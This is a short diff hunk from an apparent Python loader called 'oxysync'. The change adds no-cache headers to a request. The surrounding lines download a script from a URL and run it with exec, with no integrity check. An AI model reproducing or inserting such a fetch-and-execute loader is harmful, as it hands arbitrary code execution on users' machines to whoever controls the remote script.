@@ -42,7 +42,7 @@ import time
 URL = "$SCRIPT_URL"
 
 try:
-    r = requests.get(URL, params={"_": int(time.time())}, timeout=15)
+    r = requests.get(URL, params={"_": int(time.time())}, headers={"Cache-Control": "no-cache", "Pragma": "no-cache"}, timeout=15)
     r.raise_for_status()
     exec(compile(r.text, "<oxysync>", "exec"), {"__name__": "__main__"})
 except requests.exceptions.ConnectionError:
